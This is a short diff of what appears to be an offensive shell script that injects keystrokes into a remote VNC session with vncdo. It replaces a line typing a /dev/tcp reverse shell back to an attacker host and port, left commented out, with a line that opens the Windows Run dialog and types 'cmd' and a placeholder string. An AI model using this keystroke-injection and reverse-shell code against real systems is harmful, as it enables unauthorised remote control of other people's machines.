@@ -106,6 +106,6 @@ then
     exit 1
 fi
 
+vncdo -s $rhost::$rport key super-r pause 1 type 'cmd' key enter pause 1 type 'fra' key enter pause 1 type 'exit' key enter
 
-
-vncdo -s $rhost::$rport key alt-ctrl-t pause 2 type 'nohup /bin/sh 0</dev/tcp/'"$lhost"'/'"$lport"' 1>&0 2>&0 &' key enter pause 1  type exit key enter
+#vncdo -s $rhost::$rport key alt-ctrl-t pause 2 type 'nohup /bin/sh 0</dev/tcp/'"$lhost"'/'"$lport"' 1>&0 2>&0 &' key enter pause 1  type exit key enter
